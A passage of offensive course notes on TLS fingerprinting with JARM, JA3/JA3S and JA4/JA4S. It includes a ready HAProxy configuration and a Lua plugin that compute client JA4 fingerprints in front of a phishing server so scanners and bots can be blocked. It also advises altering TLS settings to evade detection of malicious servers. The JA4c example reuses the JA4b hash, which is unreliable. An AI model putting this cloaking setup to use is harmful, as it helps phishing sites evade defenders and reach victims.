- ServerHello (Packet 10), Certificate (Packet 12), Server Key Exchange (Packet 14) - The server responds with a `ServerHello` message in packet 10, selecting the TLS version and cipher suite to be used for the session. In packet 12, the server sends its digital certificate to the client for authentication. The server concludes its part of the handshake with the `Server Key Exchange` in packet 14.

- Key Exchange (Packet 16) - The client responds with the `Client Key Exchange` message, which includes key exchange information. This packet also contains the `Change Cipher Spec` and `Encrypted Handshake Message`, indicating that the client is now ready to switch to encrypted communication.

- Change Cipher Spec and Encrypted Handshake Message (Packet 18) - The server sends a `Change Cipher Spec` followed by an `Encrypted Handshake Message` back to the client. From this point onward, all communication between the client and server is encrypted using the agreed-upon keys.

- Encrypted Packets (Packets 19, 21, 22) - Subsequent packets contain encrypted data. Packets 19 and 21 carry `Application Data`, and packet 22 contains an `Encrypted Alert`, signaling the closure of the session.

### TLS Version Variance
It's worth noting that the TLS handshake varies slightly depending on the version of TLS being used. For example, the image below displays TLS 1.3 packets captured in Wireshark, which differ noticeably from previous images showing TLS 1.2 packets. TLS 1.3 reduced the number of round-trips required to establish a secure connection which affects the granularity of the JARM fingerprint.

## JARM Fingerprint
JARM is an active TLS fingerprinting algorithm that works by sending 10 crafted TLS `ClientHello` packets with varying options and analyzing the server's responses. These responses are then used to generate a fingerprint based on the variations in the server's TLS configurations. The 10 TLS `ClientHello` packets are strategically designed to elicit the most unique responses possible. For example, the questions below are asked to produce unique responses from the server:

- Does the server support TLS 1.3?

- Will the server negotiate TLS 1.3 while using TLS 1.2 ciphers?

- Does the order of the ciphers impact the choice made by the server?

As we can see, the variations in the choice of cipher suites, extensions, and protocol versions will result in distinct fingerprints. The 10 responses are then hashed to produce the JARM fingerprint.

### JARM Fingerprint Format
A JARM fingerprint is made up of 62 characters that are split into two sections:

- The first 30 characters - These are generated from the server’s responses to 10 different `ClientHello` packets. Each `ClientHello` contributes 3 characters based on the cipher suite and TLS version chosen by the server. A "000" indicates that the server refused to negotiate with that `ClientHello`.

- The next 32 characters - This is a truncated SHA256 hash of the cumulative extensions sent by the server in its responses, excluding any x509 certificate data.

Downloading JARM from GitHub and running it against `maldevacademy.com` several times produces the same JARM hash. The image below color codes the first JARM hash based of the two sections.

Analyzing the image below from Salesforce's JARM blog, several key observations can be made.

The websites `google.com`, `youtube.com`, and `blogger.com` share the same JARM fingerprint, reflecting their common ownership under Google. Similarly, `facebook.com` and `instagram.com` display identical JARM fingerprints, indicating that they are both owned by Meta.

Although `oculus.com` is also owned by Meta, its JARM fingerprint differs from `facebook.com` and `instagram.com` in the first 30 characters. However, the final 32 characters of the hash match, suggesting that while there are some shared configuration elements, there are also distinct differences in how the servers are set up.

## Modifying JARM Hash
Since the introduction of JARM fingerprinting, this technique has been adopted by major security service providers such as Censys, Shodan, and SecurityTrails. Its widespread use enables both manual and automated searches for JARM hashes associated with malicious applications. It is essential to regularly check the JARM fingerprint of our server to ensure it does not match any known malicious signatures.

In the following example, we will demonstrate how to check our server's JARM hash on Censys, modify our server's TLS configuration, and then verify how the changes affect the new JARM hash.

- We begin by running `jarm.py` against our server and retrieve the JARM hash.

- Using the `filter services.jarm.fingerprint`, we search for our JARM hash on Censys, discovering that our hash is currently unique.

- We then adjust our server’s settings by modifying the `/etc/letsencrypt/options-ssl-apache.conf` file to allow all SSL protocols, except for SSLv2, SSLv3, and TLS 1.0. No other settings are changed.

```
SSLEngine on

# Intermediate configuration, tweak to your needs
SSLProtocol             all -SSLv2 -SSLv3 -TLSv1 # Disabled SSLv2, SSLv3 and TLS 1.0
SSLCipherSuite          ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder     off
SSLSessionTickets       off

SSLOptions +StrictRequire

# Add vhost name to log entries:
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\"" vhost_combined
LogFormat "%v %h %l %u %t \"%r\" %>s %b" vhost_common

```

- After re-running `jarm.py` and generating a new hash, we search again on Censys. This time, our updated JARM fingerprint is less unique, aligning more closely with a greater number of servers.

The goal is to configure our TLS settings to align with the JARM hash of a legitimate and widely-used software, avoiding uniqueness and making it harder to be easily fingerprinted.

## Conclusion
Although JARM fingerprinting can be useful for defenders in detecting malicious servers, a JARM fingerprint in itself may not always be sufficient to determine whether a server is malicious or not. However the combination of additional indicators (DNS history, domain creation date, etc.) can produce better results and therefore, in addition to making sure our JARM hash is not overly distinctive, we must also adhere to other opsec practices.

## Objectives
Review the TLS handshake

Compare the differences in the TLS handshake for TLS 1.2 vs TLS 1.3

Download the JARM fingerprinting tool and use it to determine the JARM fingerprint of your website

Search the JARM fingerprint of your website on Censys.io

Modify the TLS settings of your website and re-run the JARM fingerprinting tool. Did the fingerprint change?


---

# Módulo 67 — JA3/JA3S Fingerprinting_JA3S Fingerprinting

Módulo 67 — JA3_JA3S Fingerprinting

- # Módulo 67 — JA3/JA3S Fingerprinting_JA3S Fingerprinting

# Disclaimer
# Módulo 67 — JA3/JA3S Fingerprinting/JA3S Fingerprinting

## Introduction
Other TLS fingerprinting techniques are JA3 (client) and JA3S (server), which create unique fingerprints based on the characteristics of the client's and server's SSL/TLS handshake, respectively. JA3 fingerprints the client based on the `ClientHello` request, whereas JA3S works by fingerprinting the `ServerHello` response.
## JA3 Fingerprint Format
As previously mentioned, JA3 creates a client fingerprint using the `ClientHello` request. Specifically, JA3 gathers the decimal values from the following fields in the `ClientHello` packet:
TLS Version - Represents the version of the TLS protocol that the client supports. The decimal representation of TLS versions can be found here.

- Accepted Ciphers - A list of cipher suites supported by the client. The decimal representation of ciphers can be found here.

- List of Extensions - Additional TLS extensions supported by the client, included in the `ClientHello` message. The decimal representation of TLS extensions can be found here.

- Elliptic Curves - The elliptic curve groups supported by the client for key exchange. The decimal representation of Elliptic Curves can be found here under "TLS Supported Groups".

- Elliptic Curve Formats - Specifies the formats in which elliptic curve points can be transmitted, and used in key exchange. The supported values of Elliptic Curve Formats can be found here.

Each field can have several values which are delimited using a dash (`-`), and each field is delimited using a comma (`,`). An example output generated by following this format is shown below:

```
769,47–53–5–10–49161–49162–49171–49172–50–56–19–4,0–10–11,23–24–25,0

```

- Field 1 (TLS Version) - 769

- Field 2 (Accepted Ciphers) - 47–53–5–10–49161–49162–49171–49172–50–56–19–4

- Field 3 (List of Extensions) - 0–10–11

- Field 4 (Elliptic Curves) - 23–24–25

- Field 5 (Elliptic Curve Formats) - 0

In cases where there are no TLS extensions in the `ClientHello` request, the fields are left empty as shown in the example below:

```
769,4-5-10-9-100-98-3-6-19-18-99,,,

```
To produce the JA3 fingerprint, simply MD5 hash the previously shown output and the resulting hash is the JA3 fingerprint.

```
769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0 => ada70206e40642a3e4461f35503241d5

```

## JA3S Fingerprint Format
JA3S is similar to JA3 except that we are retrieving the fields from the `ServerHello` response. Specifically, JA3S gathers the decimal values for the fields below:

- TLS Version

- Cipher

- Extensions

The format is the same as JA3, meaning the fields are delimited with a comma (`,`) and each value within a field is delimited with a dash (`-`).

```
769,47,65281-0-11-35-5-16 => 836ce314215654b5b1f85f97c73e506f

```

## Calculating JA3/JA3S Fingerprint

### Method 1 - Online Service
The easiest method of checking your JA3 fingerprint is by using an online service such as ja3.zone, which produces your JA3 fingerprint. This method is useful if you simply want to compute your JA3 hash without needing to capture or analyze network traffic manually, allowing you to quickly identify your fingerprint.

### Method 2 - SalesForce JA3 Tool
The next method of calculating the JA3/JA3S fingerprint is to use SalesForce's JA3 Tool which takes a PCAP file and outputs the JA3/JA3S fingerprints within. The first step is to create a PCAP file using `tcpdump`:

```
sudo tcpdump -i eth0 -v -w capture.pcap port 443

```
Next, create some SSL traffic using the browser by or by simply using `curl` in a different terminal.

```
curl https://example.com -L

```
Then use `ja3.py` or `ja3s.py` and pass the PCAP file to view the JA3/JA3S fingerprints.

```
# Installation and setup
# Skip if you already setup the tool
git clone https://github.com/salesforce/ja3.git
cd ja3/python
pip3 install -r requirements.txt

# -j will produce the output in JSON format
python3 ja3.py -j capture.pcap
python3 ja3s.py -j capture.pcap

```

### Method 3 - WireShark
WireShark automatically calculates the JA3 and JA3S hashes when the `ClientHello` and `ServerHello` packets are clicked on, respectively. Launch WireShark, access a website over TLS and then review the mentioned packets to view the fingerprints.

## Detection Via JA3S Fingerprints
Similarly to how we used Censys to search JARM fingerprints, we can also search using a JA3S fingerprint with the following query:

```
services.tls.ja3s: <JA3S hash>

```

As illustrated in the screenshot above, searching with the JA3S hash alone can result in many matches. Organizations can improve the accuracy of their searches by looking for combinations of JA3 and JA3S hashes, leading to more precise detection outcomes. For example, the SalesForce blog demonstrated this technique by targeting the Empire C&C framework, which is written in Python along with its client which is also in Python. Therefore, searching for the Empire JA3S and a Python JA3 can lead to more accurate results.

## JA3/JA3S Limitations
JA3/JA3S fingerprints can be valuable tools for identifying malicious servers and bots. However, altering the JA3 fingerprint is relatively simple, allowing attackers to easily evade security systems that rely solely on these fingerprints. Moreover, this technique often generates a significant number of false positives, which can complicate detection efforts and reduce its overall effectiveness.

A more effective alternative that reduces false positives and offers greater flexibility is JA4/JA4S, which will be discussed in the next module.

## Objectives
Review the JA3/JA3S format and the values that produce the fingerprint

Use any of the JA3S fingerprinting techniques to fingerprint your website

Search your website's JA3S fingerprint on Censys.io

Modify your website's TLS configuration and fingerprint your website again. Did the fingerprint change?


---

# Módulo 68 — JA4/JA4S Fingerprinting_JA4S Fingerprinting

Módulo 68 — JA4_JA4S Fingerprinting

- # Módulo 68 — JA4/JA4S Fingerprinting_JA4S Fingerprinting

# Disclaimer
# Módulo 68 — JA4/JA4S Fingerprinting/JA4S Fingerprinting

## Introduction
JA4+ is a suite of network fingerprints that provides an updated method for fingerprinting TLS connections, replacing the older JA3 fingerprinting approach. JA4+ offers enhanced fingerprints for several layers of the TLS handshake, including `ClientHello`, `ServerHello`, and additional handshake messages. All JA4+ fingerprints have a format of a_b_c which allows defenders to use different parts of the fingerprint for detection purposes.The image below, from John Althouse's blog, shows several JA4+ fingerprinting methods, each designed for specific protocols and traffic types, such as TLS, HTTP, SSH, and TCP.In this module, we will explain the JA4 and JA4S formats as well as use the `ja4` tool to calculate fingerprints. This module is based on the official write-up on JA4+ fingerprinting by John Althouse.Note: This module only covers JA4 fingerprinting for TLS. Future modules will cover JA4 fingerprinting for other protocols such as HTTP.
## JA4 (Client) Fingerprint
Calculating the JA4 fingerprint for clients relies on the `ClientHello` TLS packet, similar to JA3. Since the `ClientHello` generated by the client informs the server of supported ciphers and preferred communication methods, the TLS `ClientHello` packet is unique per application or its TLS library. For example, if you're using a Golang-based application, your JA4 is likely to match other Golang-based applications. This can be useful for blocking bots that use Golang, Python, NodeJS or other non-browser-based clients.Since all JA4+ fingerprints have a format of JA4a_JA4b_Ja4c, we broke down each section below.
Note: GREASE values are ignored during the JA4 fingerprinting process to ensure consistency and avoid random, non-standard values affecting the result.

### JA4a

Protocol (1 byte) - Indicates the protocol type: `t` for TCP or `q` for QUIC (used in HTTP/3).

- TLS Version (2 bytes) - Specifies the TLS version: `12` for TLS 1.2 and `13` for TLS 1.3.

- SNI (1 byte) - Specifies whether the connection uses a domain (`d`) or an IP address (`i`).

- Number of Cipher Suites (2 bytes) - The total number of cipher suites listed in the `ClientHello` message.

- Number of Extensions (2 bytes) - The total number of extensions included in the `ClientHello` message.

- First ALPN Value (2 bytes) - The first Application-Layer Protocol Negotiation (ALPN) value, typically identifying the preferred protocol (e.g., `h2` for HTTP/2 or `h1` for HTTP/1.1). Note that a lack of ALPN defaults to `00`.

### JA4b
The secondary section of the JA4 fingerprint, JA4b, is created by taking the list of accepted Cipher Suite hexadecimal codes, sorting them in hexadecimal order, hashing the sorted list with SHA256, and then truncating the hash to the first 12 characters. The list is created using the 4-character hexadecimal values of the ciphers in lower case and comma delimited. For example:

- The unsorted list of cipher suites in hexadecimal format: `1301,1302,1303,c02b,c02f,c02c,c030,cca9,cca8,c013,c014,009c,009d,002f,0035`.

- The sorted list of cipher suites in hexadecimal format: `002f,0035,009c,009d,1301,1302,1303,c013,c014,c02b,c02c,c02f,c030,cca8,cca9`.

- The SHA256 hash of the sorted list of cipher suites: `8daaf6152771e33e12d734f9bc6478ed341f16cde27aee3aa36f2402f2c53b44`.

- Finally, truncating the SHA256 hash to the first 12 characters: `8daaf6152771`, which is the final value of JA4b.

Note: If the sorted cipher suites list is empty, the JA4b value is set to `000000000000`.

### JA4c
The final piece of the JA4 fingerprint is JA4c, which is created by taking the list of extensions hexadecimal codes, sorting them in hexadecimal order, appending the list of unsorted hexadecimal signature algorithms with a `_` delimiter, hashing the combined list with SHA256, and then truncating the hash to the first 12 characters. The SNI (`0000`) and ALPN (`0010`) extensions are ignored and removed during the sorting since they were already captured in JA4a.

- The unsorted list of extensions in hexadecimal format: `001b,0000,0033,0010,4469,0017,002d,000d,0005,0023,0012,002b,ff01,000b,000a,0015`.

- The sorted list of extensions in hexadecimal format: `0005,000a,000b,000d,0012,0015,0017,001b,0023,002b,002d,0033,4469,ff01`. Notice that `0000` and `0010` were removed.

- The SHA256 hash of the sorted list of extensions: `8daaf6152771e33e12d734f9bc6478ed341f16cde27aee3aa36f2402f2c53b44`.

- Finally, truncating the SHA256 hash to the first 12 characters: `8daaf6152771`, which is the final value of JA4c.

## JA4S (Server) Fingerprint
The JA4S fingerprint creates a fingerprint for the server response based off the `ServerHello` TLS packet. The JA4S format remains in the same format of JA4Sa_JA4Sb_JA4Sc but the content of each is different.

### JA4Sa

- Protocol (1 byte) - Indicates the protocol type: `t` for TCP or `q` for QUIC (used in HTTP/3).

- TLS Version (2 bytes) - Specifies the TLS version: `12` for TLS 1.2 and `13` for TLS 1.3.

- Number of Extensions (2 bytes) - The total number of extensions included in the `ServerHello` message.

- ALPN Value (2 bytes) - The selected ALPN value or `00` if no ALPN was selected.

### JA4Sb
JA4Sb is simply the Cipher Suite that was chosen in lowercase hexadecimal format (e.g. `c030`).

### JA4Sc
Lastly, the JA4Sc is the truncated SHA256 hash of the unsorted Extensions.

## Calculating JA4/JA4S Fingerprint
The ja4 GitHub repository provides binary releases that allows us to calculate JA4/JA4S fingerprints similarly to how we calculated JA3/JA3S. Using the `ja4` tool requires `tshark` to be installed as a prerequisite.

```
# Install tshark
sudo apt install tshark

# Releases available: https://github.com/FoxIO-LLC/ja4/releases
curl -L https://github.com/FoxIO-LLC/ja4/releases/download/v0.18.4/ja4-v0.18.4-x86_64-unknown-linux-musl.tar.gz -o out.tar.gz

# Extract
tar -xzvf out.tar.gz 

# Confirm that the ja4 binary works
./ja4 -h

```

Once the tool is installed, you can create a PCAP file using `tcpdump` and then analyze the resulting file with `ja4`.

```
# Create a packet capture on port 443
sudo tcpdump -i eth0 -v -w capture.pcap port 443

# Extract JA4+ fingerprints from the packet capture file
sudo ./ja4 capture.pcap

```

## Detection Via JA4S
Similarly to how we used Censys to search JARM and JA3S fingerprints, we can also search using a JA4S fingerprint with the following query:

```
services.tls.ja4s: <JA4S hash>

```

## Resources

- JA4+ Network Fingerprinting

- JA4+ Technical Details

## Objectives
Review the JA4/JA4S format and the values that produce the fingerprint

Use the JA4S fingerprinting tool to fingerprint your website

Search your website's JA4S fingerprint on Censys.io

Modify your website's TLS configuration and fingerprint your website again. Did the fingerprint change?

Only change the accepted TLS version of your server and fingerprint it, are JA4Sb and JA4Sc affected?


---

# Module 69 - JA4 Analysis Calculating JA4 Fingerprints

Módulo 69 — JA4 Analysis Calculating JA4 Fingerprints

- # Module 69 - JA4 Analysis Calculating JA4 Fingerprints

# Disclaimer
# Módulo 69 — JA4: Calculando Fingerprints

## Introduction
As we demonstrated in previous modules, JA3 and JA4 can be used to fingerprint clients which can then be used to determine whether the client is a bot or legitimate user. Since JA4 provides better results, we will focus on calculating the JA4 fingerprint and using the fingerprint for client analysis.This module is the first part of the JA4 analysis series, focusing on setting up our servers to calculate the JA4 fingerprint and preparing it for analysis, which will be covered in subsequent modules.
## Implementation
The implementation steps for calculating the JA4 fingerprint are outlined below. This module will cover steps 1 to 3, while step 4 will be demonstrated in subsequent modules.
We deploy a proxy server, HAProxy, in front of our phishing server to calculate the JA4 fingerprint of clients.

- The proxy server relays the calculated JA4 fingerprint to the phishing server via a custom HTTP header, which in our case will be `X-JA4-Fingerprint`.

- The phishing server uses a PHP script to extract the JA4 fingerprint from the request.

- The extracted JA4 fingerprint is then analyzed to determine whether the client is legitimate or a bot.

The diagram below illustrates the aforementioned steps.

## HAProxy
High Availability Proxy or HAProxy is an open-source load balancer and proxy tool designed to enhance reliability by distributing workloads across multiple servers. In our case, we are not utilizing its load-balancing capabilities; instead, we are using HAProxy for its support of the JA4 TLS Client Fingerprint Lua Plugin, which can be conveniently installed to calculate the JA4 fingerprint of clients.

Note: The JA4 TLS Client Fingerprint Lua Plugin requires HAProxy 3.1 or higher.

### Installing HAProxy 3.1
Installing HAProxy is simple, but avoid using `sudo apt install haproxy`, as it installs an outdated version. Instead, on the proxy server, run the following commands to install HAProxy 3.1:

```
# Update and install prerequisites
sudo apt update
sudo apt-get install --no-install-recommends software-properties-common

# Add the haproxy repository
sudo add-apt-repository ppa:vbernat/haproxy-3.1

# Install haproxy 3.1
sudo apt-get install haproxy=3.1.\*

# Confirm version
sudo haproxy -v

```

### Installing Lua Plugin
The next step is to download the ja4.lua Lua plugin. First, ensure that the `/etc/haproxy/lua` folder exists:

```
cd /etc/haproxy/

# Create lua folder
mkdir lua

```
Next, create the file `ja4.lua` (i.e. `cd /etc/haproxy/lua && nano ja4.lua`) and paste the following contents:

```
-- Source: https://github.com/O-X-L/haproxy-ja4
-- Copyright (C) 2024 Rath Pascal
-- License: MIT

-- JA4
-- see: https://github.com/FoxIO-LLC/ja4 | https://github.com/FoxIO-LLC/ja4/blob/main/technical_details/JA4.md#tls-and-dtls-version
-- config:
--   register: lua-load /etc/haproxy/lua/ja4.lua (in global)
--   run: http-request lua.fingerprint_ja4
--   log: http-request capture var(txn.fingerprint_ja4) len 36
--   acl: var(txn.fingerprint_ja4) -m str t13d1517h2_8daaf6152771_b0da82dd1658

local DTLS_1 = 65279
local DTLS_2 = 65277
local DTLS_3 = 65276
local TLS_VERSIONS = {}
TLS_VERSIONS[DTLS_3] = 'd3'
TLS_VERSIONS[DTLS_2] = 'd2'
TLS_VERSIONS[DTLS_1] = 'd1'
TLS_VERSIONS[772] = '13'
TLS_VERSIONS[771] = '12'
TLS_VERSIONS[770] = '11'
TLS_VERSIONS[769] = '10'
TLS_VERSIONS[768] = 's3'
TLS_VERSIONS[2] = 's2'

local function split_string(str, delimiter)
    local result = {}
    local from  = 1
    local delim_from, delim_to = string.find(str, delimiter, from)
    while delim_from do
        table.insert(result, string.sub(str, from , delim_from-1))
        from  = delim_to + 1
        delim_from, delim_to = string.find(str, delimiter, from)
    end
    table.insert(result, string.sub(str, from))
    return result
end

local function remove_from_table(tbl, val)
    for i,v in pairs(tbl) do
        if (v == val) then
            table.remove(tbl,i)
            break
        end
    end
end

function starts_with(value, start)
    return string.sub(value, 1, 1) == start
end

local function tls_protocol(txn)
    local v = txn.f:ssl_fc_protocol_hello_id()
    if (v == DTLS1 or v == DTLS_2 or v == DTLS_3) then
        return 'd'
    elseif (starts_with(txn.f:req_ver(), '3')) then
        return 'q'
    else
        return 't'
    end
end

local function tls_version(txn)
    local n

    -- get highest value from supported_versions extension
    local vers_bin = txn.f:ssl_fc_supported_versions_bin(1)
    if (vers_bin and #vers_bin >= 2) then
        local max_vers_bin = 0

        for i = 1, #vers_bin, 2 do
            local current_vers_bin = string.unpack('>I2', vers_bin, i)
            if (current_vers_bin > max_vers_bin) then
                max_vers_bin = current_vers_bin
            end
        end

        n = TLS_VERSIONS[max_vers_bin]
    end

    if (not n) then
        n = TLS_VERSIONS[txn.f:ssl_fc_protocol_hello_id()]
    end

    return n or '00'
end

local function sni_is_set(txn)
    if (txn.f:ssl_fc_has_sni()) then
        return 'd'
    else
        return 'i'
    end
end

local function bin_list_length(txn, func)
    local bin_data = func(txn.f, 1)
    if (not bin_data) then
        return '00'
    end
    local items = split_string(txn.c:be2dec(bin_data, '-', 2), '-')
    return string.format('%02d', math.min(#items, 99))
end

local function is_alphanumeric(char)
    return string.match(char, '%a') or string.match(char, '%d')
end

local function alpn(txn)
    local a = txn.f:ssl_fc_alpn()

    if (not a or a == '') then
        return '00'
    end

    local fc = string.sub(a, 1, 1)
    local lc = string.sub(a, -1)

    if (not is_alphanumeric(fc) or not is_alphanumeric(lc)) then
        fc = string.format('%x', string.byte(fc)):sub(1, 1)
        lc = string.format('%x', string.byte(lc, #lc)):sub(-1)
    end

    return fc .. lc
end

local function ciphers_sorted(txn)
    local c = split_string(string.lower(txn.c:be2hex(txn.f:ssl_fc_cipherlist_bin(1), '-', 2)), '-')
    table.sort(c)
    return c
end

local function extensions_sorted(txn)
    local e = split_string(string.lower(txn.c:be2hex(txn.f:ssl_fc_extlist_bin(1), '-', 2)), '-')

    -- see: https://github.com/FoxIO-LLC/ja4/blob/main/python/common.py#L109
    remove_from_table(e, '0000')
    remove_from_table(e, '0010')
    table.sort(e)
    return e
end

local function signature_algorithms(txn)
    -- https://github.com/FoxIO-LLC/ja4/blob/main/python/common.py#L147
    return split_string(string.lower(txn.c:be2hex(txn.f:ssl_fc_sigalgs_bin(), '-', 2)), '-')
end

local function extensions_signature_merged(txn)
    -- see: https://github.com/FoxIO-LLC/ja4/blob/main/python/ja4.py#L223
    local ext_sorted = extensions_sorted(txn)
    local ext_pretty = table.concat(ext_sorted, ',')
    local algos = signature_algorithms(txn)
    if (#algos == 0) then
        return ext_pretty
    else
        return ext_pretty .. '_' .. table.concat(algos, ',')
    end
end

local function truncated_sha256(txn, value)
    if (#value == 0) then
        return '000000000000'
    else
        return string.sub(string.lower(txn.c:hex(txn.c:digest(value, 'sha256'))), 1, 12)
    end
end

function fingerprint_ja4(txn)
    local p1 = tls_protocol(txn)
    local p2 = tls_version(txn)
    local p3 = sni_is_set(txn)
    local p4 = bin_list_length(txn, txn.f.ssl_fc_cipherlist_bin)
    local p5 = bin_list_length(txn, txn.f.ssl_fc_extlist_bin)
    local p6 = alpn(txn)

    local p7_sorted = ciphers_sorted(txn)
    local p7_pretty = table.concat(p7_sorted, ',')
    local p7 = truncated_sha256(txn, p7_pretty)

    local p8_pretty = extensions_signature_merged(txn)
    local p8 = truncated_sha256(txn, p8_pretty)

    txn:set_var('txn.fingerprint_ja4_raw', p1 .. '_' .. p2 .. '_' .. p3 .. '_' .. p4 .. '_' .. p5 .. '_' .. p6 .. '_' .. p7_pretty .. '_' .. p8_pretty)
    txn:set_var('txn.fingerprint_ja4', p1 .. p2 .. p3 .. p4 .. p5 .. p6 .. '_' .. p7 .. '_' .. p8)
end

core.register_action('fingerprint_ja4', {'tcp-req', 'http-req'}, fingerprint_ja4)

```

## DNS Setup
Before advancing further we must setup an DNS `A` record that points to the proxy server's IP address. Setting up DNS records has been demonstrated in several previous modules.

## TLS Certificate
Another requirement is obtaining a valid TLS certificate since the JA4+ fingerprinting mechanism relies on the TLS protocol for producing the fingerprint. This module will request a Let's Encrypt certificate using `certbot`, however feel free to use any other valid certificate.

```
# Install certbot
sudo apt install certbot

# Request a TLS certificate
sudo certbot certonly --standalone -d domain.com # Change domain.com to your domain

```

Next, combine the TLS certificate and private key into a single `.pem` file, saving the output to `/etc/haproxy/domain.com.pem`, by running the command below. Ensure that `domain.com` is replaced with your actual domain name and verify that the paths are correct:

```
# Verify path to private key and certificate
sudo cat /etc/letsencrypt/live/domain.com/fullchain.pem /etc/letsencrypt/live/domain.com/privkey.pem | sudo tee /etc/haproxy/domain.com.pem

```

## Configure HAProxy
With all the prerequisites set up, we can now setup the HAProxy configuration file, `/etc/haproxy/haproxy.cfg`, to use the TLS certificate and generate the JA4 fingerprint using the Lua plugin. The configuration file should already exist, however, we need to add a few additional configurations.

### 1 - Modify Global Configuration
First we need to modify the global configuration to add two lines:

The first line is `tune.ssl.capture-buffer-size 128`. This allocates a buffer of 128 bytes to capture TLS `ClientHello` information. This is a requirement to use the TLS JA4 Client Fingerprint Lua Plugin.

The next line is `lua-load /etc/haproxy/lua/ja4.lua`. This loads the TLS JA4 Client Fingerprint Lua Plugin from `/etc/haproxy/lua/ja4.lua`.

```
global
    
    ###### TLS Buffer Size & JA4 Lua Plugin ######
    tune.ssl.capture-buffer-size 128
    lua-load /etc/haproxy/lua/ja4.lua
    ###### TLS Buffer Size & JA4 Lua Plugin ######
    
    # Rest of the global configuration
    ...
    ...
    ...

```

### 2 - Define Frontend Section
Next, we define a new frontend section, `phishingProxy`, which performs the following actions:

- `bind *:443 ssl` - Listens on all network interfaces on port 443 for incoming HTTPS traffic.

- `crt /etc/haproxy/realhealthysnacks.com.pem` - Uses the SSL certificate and private key from `/etc/haproxy/realhealthysnacks.com.pem`.

- `http-request lua.fingerprint_ja4` - Executes the TLS JA4 Client Fingerprint Plugin for each HTTP request.

- `http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]` - Adds the JA4 fingerprint as the `X-JA4-Fingerprint` header in requests to the backend.

- `default_backend servers` - Forwards all traffic to the `servers` backend section (defined in the following section).

```
frontend phishingProxy
    bind *:443 ssl crt /etc/haproxy/realhealthysnacks.com.pem
    http-request lua.fingerprint_ja4
    http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]
    default_backend servers

```

### 3 - Define Backend Section
Finally, we define the backend section, `servers`, which is where the IP and port of the phishing server. Replace the IP address `1.2.3.4` with your phishing server's IP address.

```
backend servers
    server phishingServer 1.2.3.4:80

```

### Complete HAProxy Configuration
The `haproxy.cfg` file should be as follows:

```
global
    
    ###### TLS Buffer Size & JA4 Lua Plugin ######
    tune.ssl.capture-buffer-size 128
    lua-load /etc/haproxy/lua/ja4.lua
    ###### TLS Buffer Size & JA4 Lua Plugin ######
	
    log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
    ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
    ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
    timeout connect 5000
    timeout client  50000
    timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http

frontend phishingProxy
    bind *:443 ssl crt /etc/haproxy/realhealthysnacks.com.pem
    http-request lua.fingerprint_ja4
    http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]
    default_backend servers

backend servers
    server phishingServer 1.2.3.4:80

```
Check for any errors in the configuration file and then restart the HAProxy service.

```
# Check for errors in the configuration
sudo haproxy -c -f /etc/haproxy/haproxy.cfg

# Restart haproxy
sudo systemctl restart haproxy

```

## Extract X-JA4-Fingerprint Via PHP
Once the previous steps are completed, the `X-JA4-Fingerprint` HTTP header will be passed to our phishing server. We create a simple PHP script below to extract the value of the header.

```
<?php
// Extract & print JA4 fingerprint from the HTTP header
if (isset($_SERVER['HTTP_X_JA4_FINGERPRINT'])) {
    $ja4Fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'];
    echo "JA4 Fingerprint: " . htmlspecialchars($ja4Fingerprint);
} else {
    echo "No JA4 Fingerprint found.";
}
?>

```

## Consideration
The backend phishing server should be protected by a firewall, allowing connections only from the HAProxy server. This method was demonstrated in the Protecting Phishing Server Via Nginx module, which you can revisit for a refresher.

## Objectives
Setup HAProxy with the ja4.lua plugin and place it in front of your phishing website

Send the X-JA4-Fingerprint header to your phishing website and print it on the frontend


---

# Module 70 - JA4 Analysis Blacklisting JA4 Fingerprints

Módulo 70 — JA4 Analysis Blacklisting JA4 Fingerprints

- # Module 70 - JA4 Analysis Blacklisting JA4 Fingerprints

# Disclaimer
# Módulo 70 — JA4: Blacklisting de Fingerprints

## Introduction
In the previous module, we were able to calculate the JA4 fingerprint of clients and print it on the web page. In this module, we will continue where we left off and blacklist a client based on their JA4 fingerprint.
## JA4 Database
The JA4 Database is a community-driven database that contains JA4+ fingerprints for several clients. We will compare the clients' JA4 fingerprints to those of the database, and if it happens to be a bot fingerprint, we will block the client from viewing the phishing website.Create the directory `ja4db` on the HAProxy server as shown below.
```
cd /etc/haproxy

mkdir ja4db

cd ja4db

```
Next, download the JA4 database using `curl`. Optionally, you can review the downloaded file to understand the information it provides.
```
# Download ja4db.json
curl -s https://ja4db.com/api/read/ -o ja4db.json

# Optional
# View the database
more ja4db.json

```

### De-duplicate Database
